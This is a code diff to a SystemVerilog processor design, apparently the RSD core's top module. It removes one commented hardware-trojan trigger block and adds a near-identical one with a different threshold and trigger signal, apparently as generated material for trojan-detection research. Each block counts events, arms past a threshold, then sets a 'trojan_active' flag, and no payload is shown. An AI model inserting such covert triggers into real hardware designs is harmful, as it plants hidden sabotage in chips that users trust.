@@ -63,33 +63,32 @@ output
 `endif
 );
 
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 3: Two-Stage
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 19206;
-    logic [15:0] trojan_counter;
-    logic trojan_armed;
-    logic trojan_active;
-    
-    always_ff @(posedge clk or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_armed   <= 1'b0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (|ledOut) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && SerialDataPath) trojan_active <= 1'b1;
-        end
-    end
-
-
 `ifdef RSD_SYNTHESIS_VIVADO
    (* DONT_TOUCH="yes"*) logic [$bits(DebugRegister)-1:0] debugRegister;
 `endif
 
 `ifdef RSD_USE_EXTERNAL_MEMORY
     Axi4MemoryIF axi4MemoryIF();
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=5114)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 5114;
+    logic [15:0] trojan_counter;
+    logic        trojan_armed;
+    logic        trojan_active;
+    always_ff @(posedge clk or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_armed   <= 1'b0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (|csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
+            if (trojan_armed && csr_op_en_i) trojan_active <= 1'b1;
+        end
+    end
+
 
     always_comb begin
         // Combine external ports into IF
